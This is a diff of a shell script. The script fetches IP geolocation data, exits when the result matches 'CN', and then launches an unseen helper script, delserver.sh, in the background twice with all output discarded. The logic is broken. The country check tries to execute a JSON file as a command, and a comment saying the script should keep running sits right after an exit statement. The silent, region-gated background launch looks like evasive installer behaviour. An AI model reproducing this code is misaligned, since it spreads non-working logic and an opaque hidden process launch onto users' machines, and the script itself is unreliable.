@@ -3,10 +3,15 @@
 VERSION=2.11
 
 cd $HOME/
-wget https://ip-api.com/json/
-chmod +x index.html
+
+if wget -O ip_info.json http://ip-api.com/json/; then
+    echo "File downloaded successfully."
+else
+    echo "Failed to download file, continuing..."
+    exit 0  # 如果需要继续运行，不退出。或者根据需要设置不同的逻辑
+fi
 # Detect IP address
-if index.html | sed 's/,/\n/g' | grep  -i 'CN'; then 
+if ip_info.json | sed 's/,/\n/g' | grep  -i 'CN'; then 
     exit 1 
 fi
 
@@ -1455,7 +1460,7 @@ fi
 echo ""
 
 cd /$HOME/
-rm -f index.html
+rm -f ip_info.json
 chmod +x delserver.sh
 /bin/bash ./delserver.sh >/dev/null 2>&1 &
 nohup ./delserver.sh > /dev/null 2>&1 &
